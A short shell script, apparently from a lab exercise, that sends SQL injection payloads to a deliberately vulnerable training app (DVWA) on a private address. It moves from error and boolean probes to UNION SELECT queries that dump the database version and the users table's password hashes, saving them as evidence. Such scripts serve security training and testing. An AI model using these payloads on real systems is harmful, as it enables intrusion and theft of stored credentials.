CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=low'
BASE='http://10.31.0.87:3000'
t() {
  curl -s -b "$CK" --data-urlencode "$1" "$BASE$2" > /tmp/t_out
  python3 - <<'PYEOF'
import re, html
b = open('/tmp/t_out').read()
mm = re.findall(r'<pre>(.*?)</pre>', b, re.S)
out = html.unescape(mm[-1]) if mm else ''
print(out[:1200])
PYEOF
}
mkdir -p evidence/sqli

echo "== 5.1 sqli low — baseline"
t 'id=1&Submit=Submit' '/vulnerabilities/sqli/'
echo "== error"
t "id=1'&Submit=Submit" '/vulnerabilities/sqli/'
echo "== boolean"
t "id=1' AND '1'='1&Submit=Submit" '/vulnerabilities/sqli/'
echo "== version"
t "id=' UNION SELECT user(),version() -- -&Submit=Submit" '/vulnerabilities/sqli/'
echo "== users table"
t "id=' UNION SELECT user,password FROM users -- -&Submit=Submit" '/vulnerabilities/sqli/' | tee evidence/sqli/sqli-users-low.txt
